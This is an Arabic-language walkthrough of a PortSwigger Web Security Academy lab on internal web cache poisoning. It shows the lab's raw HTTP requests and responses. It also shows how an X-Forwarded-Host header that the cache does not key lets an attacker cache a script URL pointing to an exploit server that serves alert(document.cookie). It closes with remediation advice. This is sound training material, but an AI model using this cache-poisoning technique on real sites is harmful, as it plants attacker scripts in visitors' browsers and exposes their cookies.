# [Internal cache poisoning](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal)

## **`الهدف`**
قم بتسميم ذاكرة التخزين المؤقت الداخلية بحيث تقوم الصفحة الرئيسية بتنفيذ `alert(document.cookie)` في متصفح الضحية.
## **`خطوات الحل`**
سنقوم بتحويل طلب الدخول إلى اللاب إلى `Repeater` 
```http
GET / HTTP/2
Host: 0a24002a049cd28d80ba039f00f3006b.web-security-academy.net
Cookie: session=qeuZwSuwcZ7Z3Ja85t4xBSUJO5XZOjD3
```
بعد ذلك سنستعمل إضافة `Param Miner` لنكتشف أن اللاب يدعم ترويسة `X-Forwarded-Host` ويعكسها في الاستجابة، وعندما نجربها فى طلب كالتالي:
```http
GET / HTTP/2
Host: 0a24002a049cd28d80ba039f00f3006b.web-security-academy.net
X-Forwarded-Host: TESTTEST
Cookie: session=qeuZwSuwcZ7Z3Ja85t4xBSUJO5XZOjD3
```
سنجد الاستجابة كالتالي حيث سنلاحظ أنه ينعكس `3` مرات.
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 8759

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//TESTTEST/'/>
        <title>Internal cache poisoning</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="//TESTTEST/resources/js/analytics.js"></script>
        <script src=//TESTTEST/js/geolocate.js?callback=loadCountry></script><script>trackingID='KWBqKx4pxSiEG9Hg'</script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Internal cache poisoning</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0a3600500431d205803202ce01ea004f.exploit-server.net'>Go to exploit server</a>
                            <a class=link-back href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/7.jpg"></a>
                        <h2>Faking It! - InstaCam</h2>
                        <p>People are going to extreme lengths to pull the wool over their friends' eyes on Social Media. If you've ever clicked your way through family photos and the perfect summer and winter getaway pics of your friends on Instagram then...</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/31.jpg"></a>
                        <h2>Finding Inspiration</h2>
                        <p>I don't care who you are or where you're from aren't just poignant Backstreet Boys lyrics, they also ring true in life, certainly as far as inspiration goes. We all lack drive sometimes, or perhaps we have the drive but...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/66.jpg"></a>
                        <h2>Machine Parenting</h2>
                        <p>It has finally happened. The progression from using TV's and tablets as a babysitter for your kids has evolved. Meet the droids, the 21st Century Machine Parenting bots who look just like mom and dad.</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/57.jpg"></a>
                        <h2>Swipe Left Please</h2>
                        <p>I don't know if you've ever been on a dating site, but if you're female I'd suggest you don't waste your time. And trust me, if you think by paying for a subscription you'll get a better selection of potential...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/29.jpg"></a>
                        <h2>Volunteering</h2>
                        <p>It is perhaps fair to say that volunteering conjures up feelings of helping those in need or taking time out of your own life to give back to society, family or friends. However, what often goes unspoken is that to...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/50.jpg"></a>
                        <h2>Smart Recognition</h2>
                        <p>The techie folks have done it again. Yet another way to secure your cell, and other electronic gadgets. This Smart Recognition is like no other you've met with yet. It all comes down to the scent of your hair, your...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/4.jpg"></a>
                        <h2>Cell Phone Free Zones</h2>
                        <p>There was a time when you could travel by train, smoke cigarettes and chat at the top of your voice. Smoking was banned and up popped quiet carriages, places for those who wish to work on their cells, laptops, and...</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/8.jpg"></a>
                        <h2>Grandma's on the net</h2>
                        <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The Facebook, The Twitter...the ones I love the most are the ones who show they have...</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/56.jpg"></a>
                        <h2>Failing The High Five - And More</h2>
                        <p>I'm one of those awkward people who shouldn't spend so much time talking to strangers/acquaintances. Too friendly and far too jolly, that's me. So, when you go in for the high five, and it fails miserably, you don't half look...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/51.jpg"></a>
                        <h2>Favours</h2>
                        <p>Favours are a tricky thing. Some people seem to ask for them all the time, some people hardly ever do and some people outright refuse to ever ask for one as they don't want to end up owing someone.</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

ولكن في بعض الأحيان قد يظهر منعكسًا مرتين فقط باستثناء `geolocate.js` كالتالي:
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 11755

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//TESTTEST/'/>
        <title>Internal cache poisoning</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="//TESTTEST/resources/js/analytics.js"></script>
        <script src=//0a24002a049cd28d80ba039f00f3006b.web-security-academy.net/js/geolocate.js?callback=loadCountry></script><script>trackingID='DdNbbhUiJBHF85Qq'</script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Internal cache poisoning</h2>
                            <a class=link-back href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aInternal+cache+poisoning%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-internal&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-internal'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/7.jpg"></a>
                        <h2>Faking It! - InstaCam</h2>
                        <p>People are going to extreme lengths to pull the wool over their friends' eyes on Social Media. If you've ever clicked your way through family photos and the perfect summer and winter getaway pics of your friends on Instagram then...</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/31.jpg"></a>
                        <h2>Finding Inspiration</h2>
                        <p>I don't care who you are or where you're from aren't just poignant Backstreet Boys lyrics, they also ring true in life, certainly as far as inspiration goes. We all lack drive sometimes, or perhaps we have the drive but...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/66.jpg"></a>
                        <h2>Machine Parenting</h2>
                        <p>It has finally happened. The progression from using TV's and tablets as a babysitter for your kids has evolved. Meet the droids, the 21st Century Machine Parenting bots who look just like mom and dad.</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/57.jpg"></a>
                        <h2>Swipe Left Please</h2>
                        <p>I don't know if you've ever been on a dating site, but if you're female I'd suggest you don't waste your time. And trust me, if you think by paying for a subscription you'll get a better selection of potential...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/29.jpg"></a>
                        <h2>Volunteering</h2>
                        <p>It is perhaps fair to say that volunteering conjures up feelings of helping those in need or taking time out of your own life to give back to society, family or friends. However, what often goes unspoken is that to...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/50.jpg"></a>
                        <h2>Smart Recognition</h2>
                        <p>The techie folks have done it again. Yet another way to secure your cell, and other electronic gadgets. This Smart Recognition is like no other you've met with yet. It all comes down to the scent of your hair, your...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/4.jpg"></a>
                        <h2>Cell Phone Free Zones</h2>
                        <p>There was a time when you could travel by train, smoke cigarettes and chat at the top of your voice. Smoking was banned and up popped quiet carriages, places for those who wish to work on their cells, laptops, and...</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/8.jpg"></a>
                        <h2>Grandma's on the net</h2>
                        <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The Facebook, The Twitter...the ones I love the most are the ones who show they have...</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/56.jpg"></a>
                        <h2>Failing The High Five - And More</h2>
                        <p>I'm one of those awkward people who shouldn't spend so much time talking to strangers/acquaintances. Too friendly and far too jolly, that's me. So, when you go in for the high five, and it fails miserably, you don't half look...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/51.jpg"></a>
                        <h2>Favours</h2>
                        <p>Favours are a tricky thing. Some people seem to ask for them all the time, some people hardly ever do and some people outright refuse to ever ask for one as they don't want to end up owing someone.</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```
وإذا حدث هذا سنظل نعيد إرسال الطلب عدة مرات كثير وقد يطول الأمر جدًا حتى نجده ينعكس ثلاثة مرات بما فيهم `geolocate.js`.

**`ملاحظات هامة:`** 
1. إذا قمنا بحذف ترويسة `X-Forwarded-Host` ستلاحظ أن الانعكاس في `canonical link element` و `analytics.js` قد اختفى فورًا من الاستجابة ولكن انعكاس `geolocate.js` مازال موجودًا وهذا يعنى أن ترويسة `X-Forwarded-Host` غير مفهرسة بواسطة بواسطة ذاكرة التخزين المؤقت الداخلية، ولكنها مفهرسة بواسطة ذاكرة التخزين المؤقت الخارجية، لذلك، يمكن استهداف الجزء المخزن داخليًا باستخدام هذه الترويسة.
2. إذا إضفنا `Cache Buster` إلى سلسلة الاستعلام سيبقى الجزء الخاص بـ `geolocate.js` منعكس وهذا يعنى أن سلسلة الاستعلام غير مفهرسة بواسطة ذاكرة التخزين المؤقت الداخلية.

لذلك سنقوم بالدخول إلى سيرفر الاستغلال الموجود في اللاب، ونقوم بتعديل حقل `File` إلى `/js/geolocate.js` ونقوم بحقن `alert(document.cookie)` في حقل `Body` ونضغط `Store`

ثم نقوم بنسخ رابط سيرفر الاستغلال ونقوم بحقنه فى ترويسة `X-Forwarded-Host:` في الطلب الأصلى للصفحة الرئيسية
```http
GET / HTTP/2
Host: 0a24002a049cd28d80ba039f00f3006b.web-security-academy.net
X-Forwarded-Host: exploit-0a3600500431d205803202ce01ea004f.exploit-server.net
Cookie: session=qeuZwSuwcZ7Z3Ja85t4xBSUJO5XZOjD3
```

وسنظل نكرر الحقن كثيرًا مرة أخرى حتى ينعكس سيرفر الاستغلال `3` مرات.
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 8912

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//exploit-0a3600500431d205803202ce01ea004f.exploit-server.net/'/>
        <title>Internal cache poisoning</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="//exploit-0a3600500431d205803202ce01ea004f.exploit-server.net/resources/js/analytics.js"></script>
        <script src=//exploit-0a3600500431d205803202ce01ea004f.exploit-server.net/js/geolocate.js?callback=loadCountry></script><script>trackingID='G7M6iHep04BryuAd'</script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Internal cache poisoning</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0a3600500431d205803202ce01ea004f.exploit-server.net'>Go to exploit server</a>
                            <a class=link-back href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/7.jpg"></a>
                        <h2>Faking It! - InstaCam</h2>
                        <p>People are going to extreme lengths to pull the wool over their friends' eyes on Social Media. If you've ever clicked your way through family photos and the perfect summer and winter getaway pics of your friends on Instagram then...</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/31.jpg"></a>
                        <h2>Finding Inspiration</h2>
                        <p>I don't care who you are or where you're from aren't just poignant Backstreet Boys lyrics, they also ring true in life, certainly as far as inspiration goes. We all lack drive sometimes, or perhaps we have the drive but...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/66.jpg"></a>
                        <h2>Machine Parenting</h2>
                        <p>It has finally happened. The progression from using TV's and tablets as a babysitter for your kids has evolved. Meet the droids, the 21st Century Machine Parenting bots who look just like mom and dad.</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/57.jpg"></a>
                        <h2>Swipe Left Please</h2>
                        <p>I don't know if you've ever been on a dating site, but if you're female I'd suggest you don't waste your time. And trust me, if you think by paying for a subscription you'll get a better selection of potential...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/29.jpg"></a>
                        <h2>Volunteering</h2>
                        <p>It is perhaps fair to say that volunteering conjures up feelings of helping those in need or taking time out of your own life to give back to society, family or friends. However, what often goes unspoken is that to...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/50.jpg"></a>
                        <h2>Smart Recognition</h2>
                        <p>The techie folks have done it again. Yet another way to secure your cell, and other electronic gadgets. This Smart Recognition is like no other you've met with yet. It all comes down to the scent of your hair, your...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/4.jpg"></a>
                        <h2>Cell Phone Free Zones</h2>
                        <p>There was a time when you could travel by train, smoke cigarettes and chat at the top of your voice. Smoking was banned and up popped quiet carriages, places for those who wish to work on their cells, laptops, and...</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/8.jpg"></a>
                        <h2>Grandma's on the net</h2>
                        <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The Facebook, The Twitter...the ones I love the most are the ones who show they have...</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/56.jpg"></a>
                        <h2>Failing The High Five - And More</h2>
                        <p>I'm one of those awkward people who shouldn't spend so much time talking to strangers/acquaintances. Too friendly and far too jolly, that's me. So, when you go in for the high five, and it fails miserably, you don't half look...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/51.jpg"></a>
                        <h2>Favours</h2>
                        <p>Favours are a tricky thing. Some people seem to ask for them all the time, some people hardly ever do and some people outright refuse to ever ask for one as they don't want to end up owing someone.</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

وقد نحتاج لتكرار إرسال الطلب أكثر من مرة بعد إنعكاسه `3` مرات حتى يزور متصفح الضحية الصفحة الرئيسية لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
إذا لم تكن البنية التحتية للموقع تستخدم `Reverse Proxy` أو` Load Balancer` يتطلب استخدام ترويسة `X-Forwarded-Host` لعمله الداخلي، فيجب إعداد الـ `Middleware` أو سيرفر الويب (مثل `Nginx` أو `Apache`) ليتجاهل أو يحذف هذه الترويسة تماماً من أي `Request` قادم قبل أن يصل إلى الواجهة الخلفية `back-end.`

ويجب ألا يعتمد التطبيق نهائياً على أي `HTTP Headers` (مثل `Host` أو `X-Forwarded-Host`) القادمة من المستخدم (لأنها `User Input` يمكن التلاعب به)، وبدلاً من ذلك، يجب الاعتماد على متغير ثابت داخل ملفات إعدادات التطبيق أو متغيرات البيئة` Environment Variables`.

ويجب استخدام مسارات نسبية `Relative Paths` لاستدعاء سكريبتات موجودة على نفس السيرفر، فيجب تعديل الكود ليكون:
```html
<script 
	src="/js/geolocate.js?callback=loadCountry">
</script>
```
